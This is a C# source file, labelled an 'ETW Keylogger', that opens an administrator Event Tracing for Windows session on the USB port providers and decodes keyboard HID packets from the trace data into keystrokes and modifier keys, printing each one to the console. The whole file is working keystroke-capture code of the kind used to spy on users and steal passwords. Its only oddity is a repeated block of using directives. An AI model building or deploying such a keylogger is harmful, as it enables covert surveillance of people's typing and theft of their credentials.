using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.Diagnostics.Tracing;
using Microsoft.Diagnostics.Tracing.Session;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Xml;
using Microsoft.Diagnostics.Tracing.Parsers;


namespace logger
{
	class ObserveUSBEvents
	{
		/// <summary>
		/// 
		/// </summary>
		private static string USB2_PROVIDERNAME = "Microsoft-Windows-USB-USBPORT";
		private static string USB3_PROVIDERNAME = "Microsoft-Windows-USB-UCX";

		private static bool ctrlCExecuted;
		private static ConsoleCancelEventHandler ctrlCHandler;

		public static void StartTrace()
		{
			Console.WriteLine("******************** ETW Keylogger ********************");

			if (TraceEventSession.IsElevated() != true)
			{
				Console.WriteLine("Must be Admin to run this utility.");
				Debugger.Break();
				return;
			}

			Console.WriteLine("Press Ctrl-C to stop monitoring.");

			using (var userSession = new TraceEventSession("ObserveEventSource"))
			{
				userSession.StopOnDispose = true;
				// Set up Ctrl-C to stop trace sessions
				SetupCtrlCHandler(() =>
				{
					userSession?.Stop();
				});

				using (var source = new ETWTraceEventSource("ObserveEventSource", TraceEventSourceType.Session))
				{
					var usb2EventParser = new DynamicTraceEventParser(source);

					usb2EventParser.All += delegate (TraceEvent data)
					{

						byte[] usbPayload = null;
						if (data.EventData().Length >= 243)
						{
							usbPayload = data.EventData().Skip(115).ToArray();
							var message = new USBMessage(usbPayload);
							if (message.Header.Length >= 128 && message.BulkOrInterrupt.Payload != null)
							{
								if (ValidatePayload(message.BulkOrInterrupt.Payload))
								{
									try
									{
										KeyboardKeymap key = (KeyboardKeymap) message.BulkOrInterrupt.Payload[(byte)PayloadKeys.KeyCode];
										KeyboardModifier modifier = (KeyboardModifier) message.BulkOrInterrupt.Payload[(byte)PayloadKeys.Modifier];
										Console.WriteLine($"Key modifier: {modifier} - Key pressed: {key} ");
									}
									catch (Exception)
									{
										Console.WriteLine("Can't decode keypress");
									}

								}

							}
						}
					};
					
					userSession.EnableProvider(USB2_PROVIDERNAME);
					userSession.EnableProvider(USB3_PROVIDERNAME);

					source.Process();
				}
				
			}
		}

		private static bool ValidatePayload(byte[] payload)
		{
			var ptr = 0;
			if (payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00)
				return false;

			ptr = 0;
			if (payload[ptr++] == 0x00 &&
			    payload[ptr++] == (byte) KeyboardModifier.Shift &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] != 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00)
				return true;

			ptr = 0;
			if (payload[ptr++] == 0x00 &&
			    payload[ptr++] == (byte) KeyboardModifier.None &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] != 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00 &&
			    payload[ptr++] == 0x00)
				return true;

				return false;
		}

		/// <summary>
		/// This implementation allows one to call this function multiple times during the
		/// execution of a console application. The CtrlC handling is disabled when Ctrl-C 
		/// is typed, one will need to call this method again to re-enable it.
		/// </summary>
		/// <param name="action"></param>
		private static void SetupCtrlCHandler(Action action)
		{
			ctrlCExecuted = false;
			// uninstall previous handler
			if (ctrlCHandler != null)
				Console.CancelKeyPress -= ctrlCHandler;

			ctrlCHandler = (object sender, ConsoleCancelEventArgs cancelArgs) =>
			{
				if (!ctrlCExecuted)
				{
					ctrlCExecuted = true; 

					Console.WriteLine("Stopping monitor");

					action(); 

					cancelArgs.Cancel = true;
				}
			};
			Console.CancelKeyPress += ctrlCHandler;
		}
	}

}
